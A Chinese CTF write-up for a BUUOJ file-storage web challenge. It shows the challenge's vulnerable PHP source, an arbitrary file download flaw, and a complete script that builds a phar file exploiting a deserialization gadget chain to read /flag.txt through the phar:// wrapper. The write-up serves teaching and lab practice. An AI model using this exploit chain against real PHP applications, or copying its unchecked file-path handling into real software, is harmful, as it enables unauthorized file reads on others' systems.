感谢buuoj的大佬们搭建的复现环境。作为一位CTF的初学者，我会把每个题目的writeup都写的尽量详细，希望能帮到后面的初学者。
>http://web42.buuoj.cn

文章会不定时继续完善，完善内容可能包括分析的错误、语病和文章结构等。

#### 复现过程
进入解题页面发现需要登录，这里只需要注册一个账号然后登录即可。
![login](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/login.png)

登录以后是一个网盘的页面，最开始只有上传功能，并且只能上传png,jpg等图片格式。

随便上传一个符合要求的文件，发现可以对其进行下载和删除。通过抓下载的包发现，该处存在一个任意文件下载的漏洞，可以下载源码。
![主界面](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/download_delete.png)
![主界面](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/downindex.png)

利用该漏洞下载download.php,delete.php以及其需要包含的class.php的内容。
```php
<?php
#download.php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp");

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>

```
```php
<?php
#delete.php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```
```php
<?php
#class.php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">ä¸è½½</a> / <a href="#" class="delete">å é¤</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```

注意到File类中的close方法执行时会获得文件的内容，如果能触发该方法，就有机会得到flag。

运行如下PHP文件，生成一个phar文件，更改后缀名为png进行上传。
（具体原理见下文的原理分析）
```php
<?php

class User {
    public $db;
}

class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar

$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$o = new User();
$o->db = new FileList();

$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```
在删除时使用burpsite抓包，修改参数，即可得到flag。
![phar伪协议](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/phar.png)

#### 原理及源码分析
分析download.php的核心源码可以发现，该文件只有很常规的下载文件操作，并且限制了不能下载文件名中带有flag的文件。
```php
<?php
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    #省略一些代码
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```

接着分析delete.php的代码。
```php
<?php
include "class.php";
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```
单独看这段代码没有发现可以利用的地方，这段代码的作用只是返回一个成功或失败的消息。

接着分析class.php。

这个文件中定义了用户和文件相关的类。
```php
<?php
#代码精简一下
class File {
    public $filename;

    public function close() {
        return file_get_contents($this->filename);
    }
}
class User {
    public $db;
    public function __destruct() {
        $this->db->close();
    }
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }
    public function __destruct() {
        #省略了一些影响阅读的table创建代码
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '</tr>';
        }
        echo $table;
    }
}
?>
```

File类中的close方法会获取文件内容，如果能触发该方法，就有可能获取flag。

User类中存在close方法，并且该方法在对象销毁时执行。

同时FileList类中存在call魔术方法，并且类没有close方法。如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。

根据以上三条线索，梳理一下可以得出结论:

如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发call魔术方法，进而变成了执行File对象的close方法。通过分析FileList类的析构方法可以知道，close方法执行后存在results变量里的结果会加入到table变量中被打印出来，也就是flag会被打印出来。

想实现上述想法，可以借助phar的伪协议。有一篇文章对phar伪协议的利用讲的很好，可以参考如下链接：

https://xz.aliyun.com/t/2715

生成phar文件后在删除的时候进行触发即可得到flag。